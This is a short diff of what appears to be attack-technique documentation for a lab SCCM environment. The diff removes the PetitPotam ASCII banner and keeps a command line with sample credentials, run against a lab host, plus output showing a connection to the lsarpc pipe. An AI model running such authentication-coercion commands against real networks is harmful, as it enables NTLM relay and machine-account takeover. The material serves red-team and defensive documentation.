@@ -43,21 +43,6 @@ This technique may allow an attacker to relay a primary site server machine acco
 ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
 └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
 
-                           
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
-
-
-
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
 [+] Connected!
